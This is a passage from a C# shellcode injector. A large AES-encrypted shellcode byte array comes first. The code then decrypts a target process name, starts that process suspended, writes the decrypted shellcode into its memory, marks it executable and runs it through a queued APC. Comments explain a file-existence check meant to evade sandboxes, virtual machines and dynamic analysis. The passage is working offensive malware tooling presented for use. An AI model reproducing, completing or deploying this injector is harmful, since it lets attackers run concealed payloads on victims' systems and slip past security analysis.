0x6c, 0xb6, 0x2f, 0xca, 0x68, 0x67, 0x37, 0xc0, 0x93, 0x41, 0x31, 0xf5, 0x69, 0xd0, 0x14, 0x32, 0x2e, 0x38, 0x02, 0xdb, 0xe8, 0x6f, 0x76, 0xaf, 0x5f, 0x29, 0x9e, 0x4e, 0x9b, 0xd0, 0x15, 0xad, 0xe4, 0x3f, 0xdb, 0x2b, 0x63, 0x65, 0x73, 0x39, 0x1f, 0x16, 0x4d, 0x5f, 0x48, 0x73, 0x24, 0x5c, 0x5e, 0xcc, 0x3e, 0x7e, 0x90, 0x48, 0xf0, 0x98, 0xd5, 0x5d, 0xe3, 0xce, 0xa2, 0x46, 0x10, 0xd5, 0x96, 0xda, 0x85, 0xdb, 0x1a, 0x1a, 0x62, 0x4a, 0x50, 0x6c, 0x7d, 0xb4, 0xfa, 0xf6, 0x32, 0x96, 0xf5, 0x33, 0xf3, 0x9e, 0x68, 0xe1, 0x33, 0x8c, 0xfc, 0x7c, 0xb5, 0xc0, 0xd5, 0x39, 0x36, 0x1a, 0x17, 0x03, 0x7f, 0x5f, 0xdf, 0x6e, 0xb6, 0x2f, 0x12, 0xe5, 0x44, 0x4a, 0xd4, 0x72, 0x6b, 0x52, 0x2b, 0xff, 0xe5, 0xa7, 0xb0, 0x90, 0xd7, 0x0e, 0x1d, 0xba, 0xf6, 0x89, 0x4a, 0x6d, 0x40, 0x2f, 0x58, 0x60, 0xd5, 0x1c, 0x46, 0x71, 0xa3, 0xfc, 0xf4, 0xbc, 0x28, 0x5b, 0xde, 0x7c, 0x59, 0x5e, 0x01, 0x6f, 0x61, 0x4e, 0xc0, 0x24, 0xa9, 0xa3, 0xed, 0xea, 0xef, 0x40, 0xba, 0x6a, 0x5d, 0x71, 0xe3, 0x65, 0xa3, 0xe3, 0x52, 0x3f, 0xe7, 0x39, 0x53, 0x68, 0x46, 0x95, 0x1c, 0x87, 0xa7, 0x3c, 0xca, 0x37, 0x7a, 0xb2, 0x16, 0x10, 0xb8, 0xca, 0xe8, 0x13, 0x61, 0xe6, 0x1d, 0xef, 0xf5, 0x36, 0x9a, 0xc3, 0xfb, 0xb4, 0x63, 0x8e, 0xdd, 0x7d, 0xf9, 0xac, 0x79, 0x98, 0x0a, 0x64, 0x2c, 0xac, 0x09, 0xef, 0x2d, 0xd0, 0x4d, 0x5f, 0xb9, 0xeb, 0x93, 0x0e, 0x5e, 0xdc, 0xec, 0x5d, 0x0c, 0x9b, 0x53, 0x1c, 0x33, 0xbe, 0x4b, 0xc6, 0x89, 0xa4, 0x04, 0x02, 0x67, 0x25, 0xf6, 0x2f, 0x8d, 0xad, 0x3c, 0x27, 0xc2, 0xed, 0xf1, 0x98, 0x48, 0xe2, 0x87, 0x25, 0xd3, 0xe4, 0x6b, 0x5a, 0xf0, 0x29, 0xa7, 0x13, 0xdf, 0x10, 0xf4, 0x38, 0xf5, 0x00, 0x93, 0xfb, 0xad, 0x15, 0x05, 0x9a, 0xd3, 0x61, 0xfe, 0x23, 0x13, 0xb2, 0x2a, 0xb0, 0x0f, 0xc6, 0x02, 0x70, 0xa3, 0x5c, 0xc0, 0xf1, 0x82, 0xfd, 0x44, 0x80, 0x12, 0x78, 0x90, 0xd9, 0xa3, 0xc9, 0x47, 0x0e, 0x7a, 0x14, 0x29, 0x52, 0x34, 0x19, 0xe3, 0x68, 0x81, 0x75, 0xb8, 0x1b, 0xd4, 0x22, 0xdd, 0x4b, 0x21, 0x01, 0xf7, 0x70, 0x61, 0x3d, 0x00, 0x4f, 0x2e, 0x5b, 0x7f, 0x28, 0x11, 0xe4, 0x3f, 0x7c, 0x99, 0x07, 0xa6, 0x27, 0x3a, 0x20, 0x2e, 0x88, 0xbf, 0x73, 0x1b, 0x3e, 0xdd, 0x36, 0x0d, 0x92, 0xdd, 0x24, 0x9f, 0x97, 0x21, 0xbd, 0x51, 0x49, 0x67, 0xf7, 0xaf, 0x76, 0x89, 0x0e, 0x7a, 0x60, 0x51, 0xaa, 0xf6, 0x2a, 0xd5, 0xb5, 0x84, 0xe9, 0xff, 0x6b, 0x84, 0xf2, 0xfb, 0x30, 0xd6, 0xee, 0xc2, 0x80, 0xaa, 0xca, 0x1c, 0xe4, 0x4a, 0x70, 0x88, 0xb4, 0xfc, 0x0f, 0x93, 0x42, 0x01, 0x89, 0xc8, 0xdd, 0x8b, 0xbe, 0x1d, 0xf7, 0x17, 0x49, 0xc8, 0xc0, 0x35, 0xdc, 0x1b, 0xf1, 0x42, 0xac, 0x58, 0x0f, 0x80, 0x61, 0xb8, 0x28, 0x1f, 0xf1, 0xf3, 0x70, 0xec, 0xbe, 0x32, 0xdf, 0xca, 0x3f, 0x70, 0x5b, 0xb1, 0x3a, 0x72, 0x6c, 0x87, 0x8b, 0xca, 0xbd, 0x09, 0xc2, 0x1d, 0x17, 0x52, 0x3d, 0x93, 0x41, 0x8b, 0x37, 0xe6, 0xd4, 0x76, 0xb0, 0x6b, 0x6b, 0x7b, 0x21, 0x4a, 0xad, 0x07, 0xd0, 0x35, 0xf9, 0xe2, 0xec, 0x09, 0x5b, 0x2b, 0x9b, 0xbb, 0xb2, 0x75, 0xf5, 0xf5, 0xec, 0xd0, 0x39, 0x0f, 0x60, 0xba, 0xfa, 0xaf, 0x5c, 0x96, 0xd7, 0x19, 0xb0, 0xc3, 0x4c, 0x5e, 0xf3, 0xca, 0xea, 0xd1, 0x13, 0x31, 0x33, 0x32, 0xf4, 0xbb, 0xe2, 0x21, 0xc7, 0x46, 0x59, 0xc5, 0x34, 0x50, 0x04, 0x63, 0x34, 0x88, 0xad, 0xc0, 0x7b, 0x0b, 0xc2, 0xdd, 0x67, 0x22, 0x1d, 0x90, 0x99, 0x62, 0x53, 0x0d, 0x59, 0x9d, 0xbf, 0x5c, 0xa1, 0xc4, 0x0d, 0x5a, 0xe4, 0x74, 0xfe, 0xd2, 0xa3, 0x04, 0x4a, 0x09, 0x55, 0x20, 0x22, 0x10, 0xdc, 0x5c, 0x26, 0x91, 0x6d, 0x98, 0x1a, 0xcb, 0x99, 0x45, 0x48, 0x1d, 0xa9, 0xc4, 0x50, 0x79, 0xb2, 0x95, 0xcb, 0x9b, 0xa2, 0x40, 0xbb, 0x79, 0xbe, 0x17, 0x2f, 0x98, 0x44, 0xaa, 0xca, 0xe6, 0x30, 0x13, 0x0e, 0x31, 0xe1, 0x4a, 0xef, 0x4d, 0xe1, 0x3b, 0x12, 0x13, 0x9d, 0x1a, 0xdd, 0x82, 0x6f, 0x16, 0xb2, 0x68, 0x86, 0x8a, 0x6c, 0x32, 0x9c, 0xa5, 0xd6, 0x5f, 0x18, 0xe3, 0x03, 0xa0, 0xd0, 0x07, 0xaf, 0x63, 0x50, 0x49, 0x79, 0x71, 0xdf, 0xe8, 0x46, 0xc6, 0xaa, 0xb1, 0x0a, 0x48, 0x39, 0x3b, 0x54, 0x04, 0xba, 0x9a, 0x34, 0x21, 0x95, 0x69, 0xda, 0x67, 0xb9, 0x8a, 0x3d, 0x75, 0xdd, 0xd6, 0x1b, 0xd0, 0x12, 0xac, 0xe0, 0x0e, 0x13, 0xdc, 0x0c, 0x07, 0xa7, 0x1c, 0x51, 0xaa, 0x59, 0xe9, 0x86, 0x8a, 0x06, 0x6b, 0xd7, 0x66, 0xca, 0xa3, 0x2a, 0xb6, 0xc9, 0xa0, 0xf5, 0x88, 0x7f, 0xef, 0x18, 0x2d, 0xaf, 0xcf, 0x63, 0xba, 0x46, 0x0b, 0xe6, 0x1d, 0xfe, 0xcf, 0x71, 0x5b, 0x60, 0x8e, 0x08, 0xcf, 0x86, 0xbc, 0xcd, 0x58, 0xdd, 0x77, 0xd8, 0x60, 0xde, 0x2f, 0xa2, 0x89, 0xac, 0xda, 0x90, 0x57, 0x03, 0x15, 0x4c, 0x21, 0x02, 0x9e, 0xae, 0x9b, 0xe7, 0x79, 0xeb, 0xa9, 0x0d, 0xe7, 0x36, 0x7b, 0x9a, 0xcd, 0xbb, 0x4f, 0x5e, 0xe0, 0x6f, 0xe2, 0xbe, 0x07, 0x58, 0x94, 0xfa, 0x5d, 0xde, 0x3a, 0x6e, 0x12, 0x2a, 0xd4, 0x1d, 0xad, 0x47, 0x2f, 0xa4, 0x7b, 0xb5, 0x0e, 0x07, 0x6c, 0xa7, 0x1d, 0x63, 0x21, 0xb4, 0x0e, 0x91, 0x14, 0x2f, 0x8b, 0x6e, 0xa4, 0xfe, 0xf1, 0x15, 0xb4, 0xf2, 0x5f, 0xba, 0xb6, 0xcf, 0xff, 0xec, 0x1b, 0x2d, 0x78, 0x42, 0xda, 0x4e, 0x19, 0xd2, 0xdd, 0x55, 0xbd, 0x9b, 0xa0, 0x58, 0x64, 0x46, 0x8e, 0x5f, 0x70, 0xde, 0xff, 0x51, 0xaf, 0xa8, 0x74, 0xf4, 0xc4, 0xe0, 0x59, 0x71, 0xc0, 0xea, 0x49, 0x08, 0xf3, 0x03, 0x9e, 0xd4, 0x03, 0xdc, 0x10, 0xd8, 0xf0, 0x61, 0x54, 0x91, 0x0d, 0x6f, 0xea, 0x5f, 0xa4, 0xad, 0x2e, 0x7a, 0x01, 0x1d, 0xb9, 0xab, 0x4b, 0x2e, 0x9b, 0xd6, 0x49, 0xc4, 0x10, 0x1d, 0x89, 0x53, 0xe3, 0x03, 0x23, 0x53, 0x99, 0x6e, 0x65, 0x96, 0x89, 0x07, 0x0f, 0x3d, 0x9a, 0x4b, 0x0a, 0x38, 0x7a, 0xfe, 0x1c, 0xcc, 0x8c, 0xb0, 0x07, 0x7f, 0x90, 0xbd, 0xd1, 0x3c, 0x21, 0x18, 0x51, 0x37, 0xa7, 0x5c, 0x2d, 0x62, 0xeb, 0xf9, 0x95, 0x99, 0xa8, 0x1e, 0xcf, 0xd3, 0xe1, 0x45, 0x1c, 0x5b, 0x32, 0xc4, 0x1d, 0x4e, 0x58, 0xad, 0x63, 0x1d, 0xdc, 0xbe, 0x34, 0x4c, 0xd8, 0x1f, 0x34, 0x89, 0x51, 0x3a, 0xcd, 0x2e, 0x99, 0xd9, 0x04, 0xe3, 0x3f, 0x96, 0xdd, 0x05, 0x6a, 0x35, 0xcf, 0x5a, 0xba, 0x95, 0x76, 0xd7, 0x69, 0x49, 0x6c, 0x34, 0x0d, 0xb7, 0xc2, 0x21, 0xf6, 0xba, 0x90, 0x56, 0x3f, 0xbf, 0xd3, 0x16, 0x8a, 0x6a, 0xfd, 0x7a, 0x41, 0x36, 0x2b, 0x23, 0xac, 0xc8, 0x7e, 0x07, 0xcb, 0xde, 0xeb, 0x75, 0x80, 0xd1, 0xdb, 0x13, 0xa9, 0x6c, 0x7d, 0x0b, 0x5c, 0x2e, 0x71, 0xb9, 0xab, 0x8b, 0xc3, 0x5c, 0xd7, 0x66, 0xe0, 0x9d, 0x00, 0xa8, 0x13, 0x0b, 0x8c, 0xdf, 0x12, 0xcd, 0x8e, 0x4f, 0xb7, 0x04, 0x98, 0xa1, 0x63, 0xe5, 0x40, 0x88, 0x2d, 0xf1, 0x8e, 0xe6, 0x3c, 0x12, 0xb9, 0x76, 0x1f, 0x7c, 0x6d, 0x35, 0xf2, 0x12, 0xb1, 0x0a, 0x84, 0xaa, 0xff, 0x1c, 0x9e, 0x31, 0xc9, 0x8d, 0x59, 0x72, 0x20, 0x9b, 0xa5, 0x39, 0xb9, 0x1d, 0xce, 0xb6, 0x3e, 0xa4, 0xf2, 0x7b, 0xd7, 0x1a, 0x9c, 0x04, 0x2a, 0x0e, 0xba, 0x90, 0x0f, 0xdd, 0x61, 0x87, 0x2d, 0x59, 0xa5, 0xc0, 0xec, 0x97, 0x56, 0x01, 0x28, 0x4c, 0xaa, 0x37, 0x98, 0xc9, 0xb9, 0x57, 0xf5, 0x6b, 0xe3, 0x01, 0xe5, 0x9b, 0x2a, 0xe1, 0x75, 0xf8, 0x6f, 0xe5, 0x82, 0x75, 0xbd, 0xd5, 0xc6, 0x9e, 0x14, 0xbf, 0xa4, 0x2b, 0x8f, 0x9b, 0xae, 0xfc, 0xcc, 0xe8, 0x12, 0xdc, 0x37, 0x3a, 0x46, 0x4c, 0x9f, 0x5e, 0x85, 0x86, 0xa9, 0xd6, 0x73, 0x54, 0x1b, 0xa8, 0xe4, 0xf2, 0xbc, 0x0d, 0xfe, 0x75, 0xb6, 0x5c, 0x55, 0xcc, 0x04, 0xbc, 0xda, 0x91, 0xcb, 0x44, 0x35, 0x7b, 0x80, 0x7b, 0xff, 0x33, 0xf9, 0x1a, 0x24, 0x7d, 0x31, 0x88, 0x04, 0xc5, 0x8d, 0xba, 0x83, 0x34, 0x45, 0x3d, 0xb0, 0xf5, 0xcc, 0x6e, 0x63, 0x1c, 0x37, 0x33, 0xa9, 0xc5, 0xb2, 0xdb, 0x13, 0xd4, 0x78, 0xc1, 0x26, 0x20, 0x04, 0xb0, 0x6b, 0x03, 0xae, 0xcd, 0x7d, 0xd3, 0x71, 0x86, 0x9a, 0xc5, 0x21, 0x32, 0x7b, 0xc2, 0x5c, 0x9a, 0xb8, 0x8d, 0xab, 0xd3, 0xcc, 0x78, 0x98, 0xa7, 0xd7, 0x92, 0x95, 0xf5, 0x0d, 0x4c, 0x64, 0xc7, 0x07, 0x7e, 0x8e, 0xe4, 0x59, 0x84, 0xd3, 0x5f, 0x65, 0x56, 0xd7, 0x53, 0x6c, 0x08, 0x27, 0xa3, 0xf2, 0xff, 0x02, 0xbc, 0x91, 0x48, 0x90, 0xf4, 0xce, 0x39, 0x15, 0x57, 0xa3, 0x86, 0xd4, 0x78, 0xe6, 0x48, 0xea, 0x92, 0x3d, 0x10, 0xfc, 0x70, 0xf7, 0x51, 0x31, 0x1b, 0x72, 0xab, 0xcb, 0x0c, 0x63, 0xc8, 0x0e, 0xe2, 0x3e, 0xd5, 0xf1, 0x4b, 0xa8, 0x32, 0xbd, 0x87, 0xf9, 0xd9, 0xf7, 0x2b, 0xd8, 0xad, 0xdf, 0xca, 0xce, 0x9e, 0x33, 0x21, 0x18, 0x6d, 0x51, 0xbf, 0x24, 0x2b, 0xfc, 0x33, 0x40, 0xe2, 0x47, 0xec, 0x25, 0xcd, 0x83, 0x7c, 0x4a, 0xe0, 0x54, 0x2d, 0x34, 0x3e, 0xf4, 0xd2, 0xb9, 0x04, 0xdc, 0xca, 0xe6, 0xa2, 0x6a, 0x56, 0x24, 0xc4, 0x79, 0xe3, 0xf8, 0x66, 0x1a, 0x40, 0x6b, 0x21, 0xea, 0xb9, 0x01, 0x6e, 0x02, 0x08, 0xe5, 0xa8, 0x68, 0xb0, 0x2d, 0x9f, 0xb6, 0xc9, 0x50, 0xb5, 0xed, 0xc6, 0x63, 0x08, 0x58, 0xa9, 0x7a, 0xe1, 0x2b, 0xac, 0x01, 0x7a, 0xc4, 0xfc, 0x37, 0xdb, 0x8a, 0x36, 0xc2, 0x25, 0x5f, 0xe0, 0x92, 0x82, 0x4f, 0xb2, 0x0a, 0x2b, 0x96, 0x0a, 0x0f, 0xf4, 0x80, 0x01, 0x54, 0x18, 0x25, 0x43, 0x89, 0xdc, 0xce, 0x64, 0x1c, 0x52, 0xd9, 0xee, 0x6f, 0xca, 0x37, 0x62, 0x90, 0x10, 0xbc, 0x87, 0x8e, 0x8d, 0x64, 0x8f, 0x1f, 0x77, 0xcf, 0xb4, 0x07, 0x1c, 0x43, 0x0f, 0x18, 0xf5, 0x07, 0xb2, 0x05, 0xeb, 0x9c, 0x55, 0x22, 0x64, 0xa8, 0xc3, 0x8a, 0x4b, 0xbc, 0xcd, 0x48, 0x4f, 0x78, 0x02, 0x44, 0xe7, 0x0f, 0x8f, 0xe9, 0xef, 0x9e, 0x1b, 0x0b, 0xd9, 0xa7, 0x09, 0xae, 0xe3, 0x58, 0xd8, 0xbd, 0xf8, 0xfe, 0x99, 0x7b, 0x8e, 0xc9, 0x86, 0x48, 0x1d, 0x05, 0xc7, 0x68, 0xf6, 0xbc, 0xa9, 0x91, 0x71, 0x90, 0x43, 0x80, 0x2d, 0x45, 0x80, 0xa4, 0xb4, 0x9e, 0xee, 0x03, 0xd6, 0xf5, 0x34, 0x2f, 0x74, 0x37, 0x1e, 0x03, 0xcf, 0x8b, 0x99, 0x8b, 0xda, 0x8a, 0x8d, 0xeb, 0xee, 0x58, 0x06, 0xb4, 0xdc, 0xa5, 0x67, 0x91, 0xaa, 0xae, 0x44, 0xd7, 0xd5, 0xa8, 0x08, 0x83, 0x54, 0xc9, 0x00, 0xf8, 0xd4, 0x74, 0xc4, 0x0d, 0x28, 0x1d, 0x68, 0xa4, 0xfe, 0x1b, 0xd1, 0x98, 0xe4, 0x5e, 0x40, 0xff, 0xc8, 0x9b, 0x57, 0x7b, 0x43, 0x5c, 0x56, 0x00, 0x9b, 0xcf, 0xf7, 0xb7, 0xb7, 0x6f, 0x24, 0x6f, 0x2d, 0x3e, 0xd3, 0xa0, 0x8a, 0xcf, 0x2e, 0x23, 0xe8, 0x71, 0x39, 0xbc, 0xb7, 0xaa, 0x70, 0x3b, 0xfd, 0xa8, 0x2d, 0x19, 0xdd, 0x5f, 0x1d, 0x6b, 0x0b, 0x77, 0xe6, 0xfb, 0xbc, 0x0d, 0xa5, 0xf6, 0x0f, 0x19, 0x3d, 0xbe, 0x4f, 0x95, 0x56, 0xfc, 0xee, 0x1d, 0xf3, 0x72, 0xa1, 0xfd, 0xe1, 0x01, 0xbd, 0x18, 0x0a, 0x7e, 0x07, 0x39, 0x79, 0xa9, 0xb7, 0x66, 0x88, 0x7f, 0xfa, 0x35, 0x81, 0x86, 0xc5, 0x7f, 0xbf, 0x06, 0x1e, 0x0a, 0xdb, 0xa6, 0x95, 0x9b, 0xac, 0x52, 0x3d, 0x2d, 0xbc, 0x9e, 0x8a, 0x7b, 0xe1, 0x89, 0xc6, 0x7b, 0xc0, 0xf2, 0xbe, 0x02, 0xc4, 0x5c, 0x52, 0x6e, 0xa5, 0x3a, 0x98, 0x48, 0xc1, 0xe0, 0x3b, 0x4a, 0x94, 0x82, 0xa4, 0xd5, 0xd7, 0xaa, 0xe3, 0x53, 0x08, 0x4f, 0x3e, 0x2b, 0xed, 0x12, 0x9c, 0x37, 0x54, 0xce, 0xc4, 0x53, 0x00, 0x41, 0x2e, 0x88, 0xf3, 0x1e, 0xaa, 0x22, 0x9d, 0x97, 0x24, 0x11, 0xaf, 0x35, 0xdb, 0xa0, 0x43, 0x80, 0xe6, 0x7e, 0x1a, 0x06, 0xe6, 0xde, 0x5c, 0xaf, 0x74, 0x98, 0x4d, 0x53, 0xf5, 0x4c, 0xaf, 0x42, 0x5b, 0xdf, 0x94, 0x44, 0xaa, 0xfe, 0x8b, 0x71, 0x33, 0x50, 0xe2, 0xec, 0x4f, 0x05, 0x61, 0x5c, 0xee, 0xbb, 0xfe, 0x2d, 0xda, 0x1a, 0x42, 0x17, 0xb1, 0x70, 0xfd, 0x34, 0x03, 0xfe, 0xd7, 0x3e, 0x05, 0xb6, 0xcd, 0xf3, 0x58, 0xd4, 0x91, 0xbb, 0x49, 0x44, 0xee, 0x56, 0x2a, 0xb5, 0xed, 0x39, 0xe3, 0x19, 0xbd, 0x27, 0x44, 0x13, 0x07, 0x94, 0x5c, 0xc0, 0x21, 0xef, 0xc3, 0x47, 0xa3, 0xee, 0x68, 0xb1, 0x95, 0x78, 0x88, 0x79, 0x09, 0x63, 0x17, 0x8d, 0x13, 0x99, 0x72, 0x2e, 0x8f, 0xb8, 0x44, 0xfc, 0x2e, 0xad, 0xda, 0x72, 0xa9, 0xd8, 0xf8, 0xd0, 0x54, 0xc6, 0xd9, 0x55, 0x07, 0x4b, 0x97, 0x99, 0x05, 0x41, 0x11, 0x14, 0xaa, 0x07, 0xde, 0xc6, 0xf5, 0x68, 0x5c, 0x13, 0xc8, 0x6f, 0x82, 0x12, 0x7e, 0xab, 0x9d, 0x00, 0xcf, 0xcc, 0x05, 0x11, 0xab, 0x75, 0x57, 0xdd, 0xef, 0xf0, 0x97, 0x77, 0xbb, 0x80, 0x1f, 0xdd, 0x59, 0x58, 0x1d, 0x91, 0x45, 0xb3, 0xfa, 0x51, 0x90, 0x12, 0xa2, 0xe6, 0x8b, 0xa5, 0xe0, 0xd5, 0x27, 0x54, 0x45, 0xbb, 0x8d, 0x50, 0x4c, 0x82, 0x41, 0xb2, 0xf1, 0xe2, 0x7c, 0xb9, 0x0f, 0x9d, 0x1d, 0xab, 0x71, 0x58, 0xb8, 0xce, 0x0f, 0xaa, 0x0f, 0x11, 0x48, 0x53, 0x86, 0xae, 0x0d, 0x61, 0x52, 0x4a, 0x65, 0x09, 0x72, 0x54, 0x10, 0xfe, 0xe9, 0x88, 0xcb, 0x1f, 0xce, 0x2f, 0xfd, 0x2c, 0x76, 0xcb, 0xff, 0xaf, 0x2e, 0x0e, 0xf9, 0xc1, 0xe7, 0xbd, 0x9f, 0xa6, 0x74, 0x08, 0xda, 0x59, 0x96, 0xd9, 0x40, 0xc2, 0x75, 0x4c, 0xa7, 0x32, 0x61, 0xc1, 0x08, 0x22, 0xe1, 0x1c, 0x9c, 0x84, 0xfd, 0x19, 0x43, 0x97, 0xa8, 0x44, 0xdc, 0xfc, 0xf4, 0x58, 0xe0, 0x4f, 0x2f, 0xfd, 0x73, 0x07, 0xd2, 0x76, 0xfd, 0xac, 0x22, 0x83, 0x4d, 0x4d, 0x8f, 0x13, 0x8e, 0x49, 0xf0, 0xed, 0x55, 0x85, 0x70, 0x0b, 0xdd, 0x8d, 0x5f, 0xd5, 0x3d, 0xe6, 0x5f, 0xd0, 0x51, 0x16, 0x7f, 0xec, 0xb4, 0x1d, 0xe6, 0x5a, 0x8e, 0x93, 0x83, 0x2b, 0x29, 0xcc, 0x05, 0xef, 0xe7, 0x1d, 0xc5, 0x94, 0x8d, 0x54, 0xdc, 0x00, 0xd7, 0x45, 0xd1, 0x51, 0x03, 0x85, 0xb4, 0x9f, 0x72, 0x05, 0x9c, 0xcb, 0xe0, 0xe1, 0x8c, 0xda, 0x67, 0x1c, 0x12, 0x29, 0xb8, 0x4f, 0x3c, 0xcd, 0xc0, 0xe8, 0x69, 0x11, 0xed, 0x9c, 0xa4, 0x04, 0xbf, 0xb5, 0x50, 0xc2, 0x25, 0xaf, 0x7d, 0x6f, 0x1a, 0x97, 0x45, 0x6c, 0x24, 0x87, 0xc6, 0x78, 0xd0, 0x88, 0xfd, 0x58, 0xec, 0x6e, 0xb3, 0x4c, 0x93, 0x32, 0x55, 0x67, 0x2e, 0xea, 0x18, 0x08, 0xf9, 0xf9, 0xf5, 0x50, 0x9b, 0x98, 0xa1, 0xc1, 0x01, 0x57, 0x3c, 0x9a, 0xa3, 0x5a, 0x6f, 0x05, 0x36, 0x40, 0xf0, 0xa2, 0x87, 0x68, 0xf7, 0x9c, 0xf6, 0xb3, 0x5e, 0x67, 0x98, 0xb2, 0xca, 0xd9, 0x42, 0xab, 0x94, 0xc4, 0x20, 0xe0, 0x28, 0x84, 0xb6, 0x28, 0x0a, 0xb5, 0x47, 0x67, 0x01, 0x9b, 0x16, 0xd5, 0xc2, 0x54, 0x83, 0x36, 0x73, 0xea, 0xb6, 0xe8, 0x7f, 0x24, 0x71, 0x33, 0x46, 0x5d, 0xf1, 0xfe, 0x72, 0x7a, 0xb2, 0x50, 0x43, 0x90, 0x54, 0x5e, 0x63, 0x4b, 0x0b, 0xb7, 0x3b, 0x94, 0xd9, 0x35, 0x69, 0x85, 0xa1, 0x8f, 0x87, 0x80, 0xcc, 0x31, 0x9d, 0xa8, 0xa1, 0x3c, 0x02, 0xf8, 0xee, 0x91, 0xd5, 0xfa, 0x9d, 0x14, 0x4c, 0x6d, 0x32, 0x43, 0xe0, 0xd2, 0x97, 0x3c, 0xce, 0x41, 0xa5, 0x72, 0x25, 0x1c, 0xf3, 0x69, 0x33, 0xaa, 0x07, 0xaa, 0x6c, 0xff, 0x47, 0x74, 0xef, 0x33, 0x2a, 0xe8, 0xb0, 0xcb, 0x21, 0xc6, 0xfd, 0x4f, 0x2c, 0x05, 0x7b, 0xf3, 0x97, 0xdd, 0xac, 0x5b, 0xe7, 0xd2, 0x30, 0x58, 0xc0, 0xe8, 0x23, 0x93, 0x8c, 0xbb, 0x02, 0x1c, 0x45, 0x6c, 0xd0, 0xc7, 0xdb, 0x4c, 0x94, 0xbb, 0x35, 0x1e, 0x8e, 0x77, 0x5b, 0xfa, 0xaa, 0xcf, 0x32, 0x17, 0x84, 0x09, 0xc3, 0xfd, 0xf4, 0x09, 0x8c, 0x38, 0x31, 0x9e, 0x3c, 0xc3, 0x94, 0x10, 0x56, 0x41, 0x13, 0x79, 0x53, 0x71, 0x06, 0x0e, 0xaf, 0xaf, 0xc6, 0xf0, 0x1a, 0xc9, 0x6a, 0xe5, 0x4f, 0xb2, 0x96, 0x7c, 0xdf, 0xf6, 0x5f, 0x1b, 0xa1, 0x5e, 0x11, 0xc2, 0x1a, 0x50, 0x89, 0xd9, 0x8d, 0xcc, 0x80, 0x72, 0xaf, 0x0c, 0xd9, 0x9a, 0x01, 0x8b, 0xca, 0xab, 0x2f, 0x2d, 0xf0, 0xf6, 0x47, 0x66, 0x39, 0xc4, 0x95, 0x89, 0xdc, 0x9a, 0xa3, 0xb8, 0xa3, 0x17, 0xe8, 0x5b, 0xd0, 0x23, 0x9b, 0x95, 0xd1, 0x9c, 0xa3, 0x90, 0x12, 0x80, 0x61, 0x57, 0xb5, 0x3a, 0xfd, 0x80, 0x00, 0x6a, 0x97, 0x4d, 0x47, 0xb6, 0x7a, 0x96, 0x64, 0x06, 0xde, 0x99, 0xdc, 0x8e, 0x22, 0x71, 0xbe, 0xf1, 0xf3, 0xb2, 0x13, 0x67, 0x84, 0xa4, 0xce, 0x9e, 0x1c, 0x9c, 0x3b, 0x5b, 0x11, 0x71, 0x6d, 0x8a, 0x80, 0x54, 0xc6, 0x8c, 0xae, 0xef, 0x2d, 0xd7, 0x35, 0x7e, 0x4b, 0x33, 0x19, 0xd8, 0xa3, 0x7c, 0x9e, 0x8a, 0xdf, 0x9a, 0x5d, 0x0d, 0x27, 0x3c, 0x5c, 0xa7, 0x3c, 0x05, 0x39, 0xfd, 0xac, 0x11, 0x6b, 0xf1, 0xf7, 0xa3, 0x20, 0x55, 0x26, 0xd7, 0x51, 0x30, 0x09, 0x19, 0x48, 0xbb, 0x63, 0x00, 0xa8, 0x22, 0x8b, 0x29, 0x15, 0xaa, 0xe0, 0xfa, 0xfc, 0xe5, 0x69, 0x88, 0x31, 0xad, 0x9a, 0x74, 0x13, 0x26, 0xe3, 0x0b, 0xe0, 0x45 };
        //process in which shellcode will be injected
        process_byte = new byte[] { 0xf8, 0x8e, 0xbf, 0xce, 0x6a, 0x48, 0xcb, 0xa1, 0xbf, 0xae, 0xf2, 0x29, 0x4f, 0xce, 0xf9, 0xe3, 0x57, 0xf2, 0x93, 0x64, 0x38, 0x06, 0x06, 0x87, 0x8c, 0x25, 0x7e, 0xf4, 0x33, 0x46, 0xd6, 0x30, 0x22, 0xf8, 0xdb, 0x5d, 0x2b, 0xb1, 0x53, 0x0b, 0xf1, 0xec, 0x27, 0xac, 0xe5, 0x5b, 0x41, 0x98 };
        
        string hashed = ComputeSha256Hash(aes_key);
        string fixed_hash = hashed.Substring(0, 32);

        string roundtrip = DecryptAES(process_byte, fixed_hash, aes_iv);
        byte[] temp = Convert.FromBase64String(roundtrip);
        string process = Encoding.UTF8.GetString(temp);
        //Console.WriteLine(process);

        STARTUPINFO sInfo = new STARTUPINFO();
        PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION();
        bool success = CreateProcess(process, null, IntPtr.Zero, IntPtr.Zero, false, ProcessCreationFlags.CREATE_SUSPENDED | ProcessCreationFlags.CREATE_NO_WINDOW , IntPtr.Zero, null, ref sInfo, out pInfo);
        IntPtr resultPtr = VirtualAllocEx(pInfo.hProcess, IntPtr.Zero, shellcode.Length, MEM_COMMIT, PAGE_READWRITE);
        IntPtr bytesWritten = IntPtr.Zero;

        //This condition has been added to bypass sandbox/VM or even dynamic analysis detection
        //You can add a path to a file that is not necessarily present in sandboxes or VM then shellcode will not be decrypted or injected!
        //For this program to successfully inject, create a file named "a.txt" in the same working directory as this injector.
        string cwd_path = Directory.GetCurrentDirectory() + "/a.txt";
        if (File.Exists(cwd_path))
        {
            //Console.WriteLine("a.txt exists");

            string round_trip = DecryptAES(shellcode, fixed_hash, aes_iv);
            byte[] decrypted = Convert.FromBase64String(round_trip);
            //Console.WriteLine("Decrypted Bytes: " + ByteArrayToString(decrypted));

            bool resultBool = WriteProcessMemory(pInfo.hProcess,resultPtr,decrypted,decrypted.Length, out bytesWritten);
            uint oldProtect = 0;
            resultBool = VirtualProtectEx(pInfo.hProcess, resultPtr, decrypted.Length, PAGE_EXECUTE_READ, out oldProtect );
            Process newProcess = Process.GetProcessById((int)pInfo.dwProcessId);
            ProcessThreadCollection tCollection = newProcess.Threads;
            IntPtr oThread = OpenThread(ThreadAccess.SET_CONTEXT, false, tCollection[0].Id);
            IntPtr ptr = QueueUserAPC(resultPtr,oThread,IntPtr.Zero);
            IntPtr rezumeThread = pInfo.hThread;
            ResumeThread(rezumeThread);
        }
        else
        {
            Console.WriteLine("File Not Found");
        }
    }

        private static UInt32 MEM_COMMIT = 0x1000;
        private static UInt32 PAGE_EXECUTE_READ = 0x20;
        private static UInt32 PAGE_READWRITE = 0x04;

        [Flags]
        public enum ProcessAccessFlags : uint
        {
            All = 0x001F0FFF,
            Terminate = 0x00000001,
            CreateThread = 0x00000002,
            VirtualMemoryOperation = 0x00000008,
            VirtualMemoryRead = 0x00000010,
            VirtualMemoryWrite = 0x00000020,
            DuplicateHandle = 0x00000040,
            CreateProcess = 0x000000080,
            SetQuota = 0x00000100,
